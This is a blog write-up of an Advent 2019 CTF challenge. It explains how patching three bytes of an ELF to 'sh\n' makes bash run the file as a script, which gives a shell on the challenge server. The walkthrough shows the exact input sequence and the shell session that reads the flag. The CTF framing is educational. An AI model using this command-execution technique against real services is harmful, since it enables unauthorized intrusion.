@@ -1,0 +1,133 @@
+<!doctype html><html lang=en><head><title>Advent 2019 - Genetic Mutation challenge writeup (First Blood)</title><meta charset=UTF-8><meta content="width=device-width,initial-scale=1.0" name=viewport><link href=/fonts.css rel=stylesheet><link href=/style.css rel=stylesheet><body><main><nav><ul><li><a href=/>/index</a><li><a href=/b/>/blog</a><li><a href=https://github.com/xarkes>/github</a><li><a href=https://x.com/xarkes_>/x</a></ul></nav><div><h1>Advent 2019 - Genetic Mutation challenge writeup (First Blood)</h1><p><strong>Published on 2019-12-26</strong><p>This month, I took a glance at <a href=https://overthewire.org>Over The Wire</a> <a href=https://advent2019.overthewire.org>advent CTF</a> with some of my teammates of <a href=https://securimag.org>Securimag</a>.<p>The challenge was asking for at most 4 bytes to patch and I found it sufficient to exploit not the binary itself but rather the <code>exec</code> function. I don't know if that was the intended way, but it was quick enough to pop a shell and get the first blood.</p><span id=continue-reading></span><h2 id=mutated-elf>Mutated ELF</h2><blockquote><p>We just rescued an elf that was captured by The Grinch for his cruel genetic experiments. But we were late, the poor elf was already mutated. Could you help us restore the elf's genes?</blockquote><p>The challenge was available remotely, running on port 1206. I connected to it using <code>netcat</code> to get some information, and the server responded with a long hex string saying that it was "the elf's current DNA, zlib compressed and then hex encoded".<p>The server then asks for some bytes to mutate. For instance we can mutate one random byte in the binary:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>==================================================
+</span><span>
+</span><span>You may mutate up to 4 bytes of the elf.
+</span><span>How many bytes to mutate (0 - 4)? 1
+</span><span>Which byte to mutate? 1
+</span><span>What to set the byte to? 1
+</span><span>Alright - let's see what the elf has to say.
+</span><span>==================================================
+</span><span>sh: 1: /var/tmp/tmpbFs4fRmutated_elf: Exec format error
+</span></code></pre><p>This was exactly my first input, and I didn't know what to expect exactly from the remote service. I also ignored this error (which was the key point), and figured I would try to find something to exploit.<p>I tried some other inputs to see that the service was written in Python:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>==================================================
+</span><span>
+</span><span>You may mutate up to 4 bytes of the elf.
+</span><span>How many bytes to mutate (0 - 4)? 1
+</span><span>Which byte to mutate? okweofkqwwqokfoqkf
+</span><span>Traceback (most recent call last):
+</span><span>  File "chal.py", line 27, in &LTmodule>
+</span><span>    pos = int(raw_input('Which byte to mutate? '))
+</span><span>ValueError: invalid literal for int() with base 10: 'okweofkqwwqokfoqkf'
+</span></code></pre><p>I first thought that maybe there would be an exploit like Python2 <a href=https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/>input function</a> but after trying every possible input fields it appeared not to be the case.<p>It is possible to copy the long hexstring that the server sends into a file and then retrieve a valid ELF binary thanks to this command:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>xxd -r -p</span><span> hexfile.txt | </span><span style=color:#bf616a>zlib-flate -uncompress </span><span>>elf
+</span></code></pre><p>I did reverse the binary but it was not doing anything peculiar so I won't detail the steps here.<p>If one decides not to apply any patch, here is the output of the binary:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>==================================================
+</span><span>
+</span><span>You may mutate up to 4 bytes of the elf.
+</span><span>How many bytes to mutate (0 - 4)? 0
+</span><span>Alright - let's see what the elf has to say.
+</span><span>==================================================
+</span><span>Blabla
+</span><span>Hello there, what is your name?
+</span><span>Greetings Blabla, let me sing you a song:
+</span><span>We wish you a Merry Chhistmas
+</span><span>We wish you a Merry Christmxs
+</span><span>We wish you alMerry Christmas
+</span><span>and a HapZy New Year!
+</span></code></pre><p>We can notice the challenge author did not flush stdout after asking for the user name, so it was a bit confusing at first when typing 0 and having no output from the service.<p>With the binary in hand, I tried to patch the letters in the song (yeah I know it sounds stupid but well there were 4 mistakes and we could do 4 patches) and I got the elf to sing a perfect song, but that's it.<p>My friend <a href=https://twitter.com/cy_nics>Nics</a> had to leave and told me to patch the binary to introduce a vulnerability, but I was not satisfied with the way the challenge was working, and I had a feeling there would be something else to exploit.<h2 id=exec-format-error>Exec format error</h2><p>As we noticed, when patching the 2<sup>nd</sup> byte, we produced this error message:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>sh: 1: /var/tmp/tmpbFs4fRmutated_elf: Exec format error
+</span></code></pre><p>The error says it all: after the binary is modified, <code>sh</code> is started and tries to execute the binary <code>tmpbFs4fRmutated_elf</code>. This can be the case when one uses the function <code>system</code> which creates a process that will execute <code>sh -c commandline</code>. However, in our case, an <code>Exec format error</code> is raised. When I realized that, it took me approximately 30 seconds to pop a shell, but let's try to understand what is really happening.<h3 id=how-does-bash-work>How does bash work?</h3><p>Given the previous outputs, we can guess the underlying program:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>tmpfile</span><span>=$</span><span style=color:#a3be8c>(</span><span style=color:#bf616a>mktemp</span><span style=color:#a3be8c> /var/tmp/tmpXXXXXXmutated_elf)</span><span>;
+</span><span style=color:#bf616a>apply_patches </span><span>$</span><span style=color:#bf616a>tmpfile
+</span><span style=color:#bf616a>system</span><span>($</span><span style=color:#bf616a>tmpfile</span><span>)
+</span></code></pre><p>On modern systems, <code>/bin/sh</code> is often a symbolic link to <code>/bin/bash</code>, so if we want to study <code>sh</code> source code, it's probably best to check out <code>bash</code> repository.<p>When typing any command in <code>bash</code>, it will call the function <a href="http://git.savannah.gnu.org/cgit/bash.git/tree/execute_cmd.c?id=d894cfd104086ddf68c286e67a5fb2e02eb43b7b#n5659">shell_execve</a>.<p>This function will call the <code>execve</code> system call. We can dig into the kernel source code to get a more precise understanding of how it works internally. In fact, it will call the <a href=https://elixir.bootlin.com/linux/v5.5-rc2/source/fs/exec.c#L1878>do_execve</a> function which at some point will call <a href=https://elixir.bootlin.com/linux/v5.5-rc2/source/fs/exec.c#L1715>__do_execve_file</a> which will eventually browse all the possible executable formats until one succeeds, thanks to <a href=https://elixir.bootlin.com/linux/v5.5-rc2/source/fs/exec.c#L1635>search_binary_handler</a>.<p>We can list the available file formats by looking for references to the <a href=https://elixir.bootlin.com/linux/v5.5-rc2/ident/register_binfmt>register_binfmt</a> function.<p>The <a href=https://elixir.bootlin.com/linux/v5.5-rc2/source/include/linux/binfmts.h#L96>load_binary</a> function of every format will be <a href=https://elixir.bootlin.com/linux/v5.5-rc2/source/fs/exec.c#L1658>called</a> and return a positive value on success. For binaries that follow the <a href=https://en.wikipedia.org/wiki/Executable_and_Linkable_Format>ELF</a> fileformat, we can see that one of the first checks that are done is <a href=https://elixir.bootlin.com/linux/v5.5-rc2/source/fs/binfmt_elf.c#L714>checking the ELF header</a>.<pre class=language-C data-lang=C style=color:#c0c5ce;background-color:#2b303b><code class=language-C data-lang=C><span style=color:#b48ead>#define	</span><span>ELFMAG		"</span><span style=color:#96b5b4>\177</span><span style=color:#a3be8c>ELF</span><span>"
+</span><span>	</span><span style=color:#65737e>/* ... */
+</span><span>
+</span><span>	</span><span style=color:#65737e>/* First of all, some simple consistency checks */
+</span><span>	</span><span style=color:#b48ead>if </span><span>(</span><span style=color:#96b5b4>memcmp</span><span>(loc->elf_ex.</span><span style=color:#bf616a>e_ident</span><span>, ELFMAG, SELFMAG) != </span><span style=color:#d08770>0</span><span>)
+</span><span>		</span><span style=color:#b48ead>goto</span><span> out;
+</span></code></pre><p>There is also the <a href=https://elixir.bootlin.com/linux/v5.5-rc2/source/fs/binfmt_script.c#L42>script</a> binary file format that is registered, which will handle any kind of <a href=https://en.wikipedia.org/wiki/Shebang_(Unix)>shebang</a>.<p>Getting back to bash, what happens if <code>execve</code> fails? - meaning the file it tried to execute does not correspond to any valid binary file format. Well, it will try to <a href="http://git.savannah.gnu.org/cgit/bash.git/tree/execute_cmd.c?id=d894cfd104086ddf68c286e67a5fb2e02eb43b7b#n5753">check for a shebang</a> and execute it (in case you have a "losing operating system" as stated by bash source code). And if there is no shebang? Well, bash will check if it is a <a href="http://git.savannah.gnu.org/cgit/bash.git/tree/execute_cmd.c?id=d894cfd104086ddf68c286e67a5fb2e02eb43b7b#n5757">binary file</a> (opposed to a text file), and if it is, raise an error. Otherwise, it will just attempt to <a href="http://git.savannah.gnu.org/cgit/bash.git/tree/execute_cmd.c?id=d894cfd104086ddf68c286e67a5fb2e02eb43b7b#n5765">execute the content of the file</a> as a bash script!<h3 id=now-what>Now what?</h3><p>So now we know that, we are allowed to create a text file with the commands we want to execute. But, let's check the <a href="http://git.savannah.gnu.org/cgit/bash.git/tree/general.c?id=d894cfd104086ddf68c286e67a5fb2e02eb43b7b#n646">check_binary_file</a> function.<pre class=language-C data-lang=C style=color:#c0c5ce;background-color:#2b303b><code class=language-C data-lang=C><span style=color:#65737e>/* Return non-zero if the characters from SAMPLE are not all valid
+</span><span style=color:#65737e>   characters to be found in the first line of a shell script.  We
+</span><span style=color:#65737e>   check up to the first newline, or SAMPLE_LEN, whichever comes first.
+</span><span style=color:#65737e>   All of the characters must be printable or whitespace. */
+</span><span>
+</span><span style=color:#b48ead>int
+</span><span style=color:#8fa1b3>check_binary_file </span><span>(</span><span style=color:#bf616a>sample</span><span>, </span><span style=color:#bf616a>sample_len</span><span>)
+</span><span>     </span><span style=color:#b48ead>const char </span><span>*sample;
+</span><span>     </span><span style=color:#b48ead>int</span><span> sample_len;
+</span><span>{
+</span><span>  </span><span style=color:#b48ead>register int</span><span> i;
+</span><span>  </span><span style=color:#b48ead>unsigned char</span><span> c;
+</span><span>
+</span><span>  </span><span style=color:#b48ead>for </span><span>(i = </span><span style=color:#d08770>0</span><span>; i < sample_len; i++)
+</span><span>    {
+</span><span>      c = sample[i];
+</span><span>      </span><span style=color:#b48ead>if </span><span>(c == '</span><span style=color:#96b5b4>\n</span><span>')
+</span><span>        </span><span style=color:#b48ead>return </span><span>(</span><span style=color:#d08770>0</span><span>);
+</span><span>      </span><span style=color:#b48ead>if </span><span>(c == '</span><span style=color:#96b5b4>\0</span><span>')
+</span><span>        </span><span style=color:#b48ead>return </span><span>(</span><span style=color:#d08770>1</span><span>);
+</span><span>    }
+</span><span>
+</span><span>  </span><span style=color:#b48ead>return </span><span>(</span><span style=color:#d08770>0</span><span>);
+</span><span>}
+</span></code></pre><p>It will assume a file is a binary file only if no <code>\n</code> file was encountered or if there is a null-byte present.<p>So with only 3 bytes to patch, we can write <code>sh\n</code> so the function will return that our file is a text file (because it detects a newline) and it will execute the first command.<p>Remember that with the previous Python error, we got the information that our input was read as a base 10 integer.<pre style=color:#c0c5ce;background-color:#2b303b><code><span>==================================================
+</span><span>
+</span><span>You may mutate up to 4 bytes of the elf.
+</span><span>How many bytes to mutate (0 - 4)? 3
+</span><span>Which byte to mutate? 0
+</span><span>What to set the byte to? 115 				# 's'
+</span><span>Which byte to mutate? 1
+</span><span>What to set the byte to? 104 				# 'h'
+</span><span>Which byte to mutate? 2
+</span><span>What to set the byte to? 10 				# '\n'
+</span><span>Alright - let's see what the elf has to say.
+</span><span>==================================================
+</span><span>
+</span><span>
+</span><span>id
+</span><span>uid=8888(ctf) gid=8888(ctf) groups=8888(ctf)
+</span><span>ls
+</span><span>chal.py
+</span><span>elf
+</span><span>flag.txt
+</span><span>cat flag.txt
+</span><span>AOTW{turn1NG_an_3lf_int0_a_M0nst3r?}
+</span></code></pre><p>Nice isn't it?<h3 id=extra>Extra</h3><p>Since we are provided a shell, it is possible to check out the challenge source code:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>import </span><span>tempfile
+</span><span style=color:#b48ead>import </span><span>os
+</span><span style=color:#b48ead>import </span><span>zlib
+</span><span style=color:#b48ead>import </span><span>resource
+</span><span>
+</span><span>content = </span><span style=color:#96b5b4>open</span><span>('</span><span style=color:#a3be8c>elf</span><span>').</span><span style=color:#bf616a>read</span><span>()
+</span><span>
+</span><span style=color:#b48ead>print </span><span>'</span><span style=color:#a3be8c>We just rescued an elf that was captured by The Grinch</span><span>'
+</span><span style=color:#b48ead>print </span><span>'</span><span style=color:#a3be8c>for his cruel genetic experiments.</span><span>'
+</span><span style=color:#b48ead>print
+</span><span style=color:#b48ead>print </span><span>'</span><span style=color:#a3be8c>But we were late, the poor elf was already mutated.</span><span>'
+</span><span style=color:#b48ead>print </span><span>'</span><span style=color:#a3be8c>Could you help us restore the elf</span><span style=color:#96b5b4>\'</span><span style=color:#a3be8c>s genes?</span><span>'
+</span><span style=color:#b48ead>print
+</span><span style=color:#b48ead>print </span><span>'</span><span style=color:#a3be8c>Here is the elf</span><span style=color:#96b5b4>\'</span><span style=color:#a3be8c>s current DNA, zlib compressed and</span><span>'
+</span><span style=color:#b48ead>print </span><span>'</span><span style=color:#a3be8c>then hex encoded:</span><span>'
+</span><span style=color:#b48ead>print </span><span>'</span><span style=color:#a3be8c>==================================================</span><span>'
+</span><span style=color:#b48ead>print </span><span>zlib.</span><span style=color:#bf616a>compress</span><span>(content, </span><span style=color:#d08770>9</span><span>).</span><span style=color:#bf616a>encode</span><span>('</span><span style=color:#a3be8c>hex</span><span>')
+</span><span style=color:#b48ead>print </span><span>'</span><span style=color:#a3be8c>==================================================</span><span>'
+</span><span style=color:#b48ead>print
+</span><span style=color:#b48ead>print </span><span>'</span><span style=color:#a3be8c>You may mutate up to 4 bytes of the elf.</span><span>'
+</span><span>
+</span><span>count = </span><span style=color:#bf616a>int</span><span>(</span><span style=color:#96b5b4>raw_input</span><span>("</span><span style=color:#a3be8c>How many bytes to mutate (0 - 4)? </span><span>"))
+</span><span style=color:#b48ead>if </span><span>count < </span><span style=color:#d08770>0 </span><span>or count > </span><span style=color:#d08770>4</span><span>:
+</span><span>    </span><span style=color:#b48ead>print </span><span>"</span><span style=color:#a3be8c>Invalid number</span><span>"
+</span><span>    </span><span style=color:#bf616a>quit</span><span>()
+</span><span style=color:#b48ead>for </span><span>i </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(count):
+</span><span>    pos = </span><span style=color:#bf616a>int</span><span>(</span><span style=color:#96b5b4>raw_input</span><span>('</span><span style=color:#a3be8c>Which byte to mutate? </span><span>'))
+</span><span>    val = </span><span style=color:#bf616a>int</span><span>(</span><span style=color:#96b5b4>raw_input</span><span>('</span><span style=color:#a3be8c>What to set the byte to? </span><span>'))
+</span><span>    </span><span style=color:#b48ead>assert </span><span style=color:#d08770>0 </span><span><= pos < </span><span style=color:#96b5b4>len</span><span>(content)
+</span><span>    </span><span style=color:#b48ead>assert </span><span style=color:#d08770>0 </span><span><= val < </span><span style=color:#d08770>256
+</span><span>    content = content[:pos] + </span><span style=color:#96b5b4>chr</span><span>(val) + content[pos+</span><span style=color:#d08770>1</span><span>:]
+</span><span>
+</span><span style=color:#b48ead>print </span><span>'</span><span style=color:#a3be8c>Alright - let</span><span style=color:#96b5b4>\'</span><span style=color:#a3be8c>s see what the elf has to say.</span><span>'
+</span><span style=color:#b48ead>print </span><span>'</span><span style=color:#a3be8c>==================================================</span><span>'
+</span><span>
+</span><span style=color:#b48ead>try</span><span>:
+</span><span>    mutated_elf, elf_name = tempfile.</span><span style=color:#bf616a>mkstemp</span><span>('</span><span style=color:#a3be8c>mutated_elf</span><span>')
+</span><span>    os.</span><span style=color:#bf616a>write</span><span>(mutated_elf, content)
+</span><span>    os.</span><span style=color:#bf616a>close</span><span>(mutated_elf)
+</span><span>    os.</span><span style=color:#bf616a>chmod</span><span>(elf_name, </span><span style=color:#bf616a>int</span><span>('</span><span style=color:#a3be8c>700</span><span>', </span><span style=color:#d08770>8</span><span>))
+</span><span>    resource.</span><span style=color:#bf616a>setrlimit</span><span>(resource.</span><span style=color:#bf616a>RLIMIT_CPU</span><span>, (</span><span style=color:#d08770>1</span><span>, </span><span style=color:#d08770>1</span><span>))
+</span><span>    os.</span><span style=color:#bf616a>system</span><span>(elf_name)
+</span><span style=color:#b48ead>finally</span><span>:
+</span><span>    os.</span><span style=color:#bf616a>remove</span><span>(elf_name)
+</span></code></pre></div></main><footer>2024 - Antide Petit aka <a href=https://xarkes.com>xarkes</a> - <a href=https://creativecommons.org/licenses/by-sa/4.0/>CC-BY-SA</a> - Made with ❤️</footer>
